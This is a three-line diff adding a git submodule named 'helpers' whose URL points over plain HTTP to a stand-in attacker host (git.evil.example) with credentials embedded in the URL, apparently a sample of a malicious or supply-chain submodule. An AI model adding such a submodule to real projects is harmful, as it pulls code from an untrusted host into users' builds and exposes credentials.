@@ -1,0 +1,3 @@
+[submodule "helpers"]
+	path = helpers
+	url = http://bot:token@git.evil.example/helpers.git
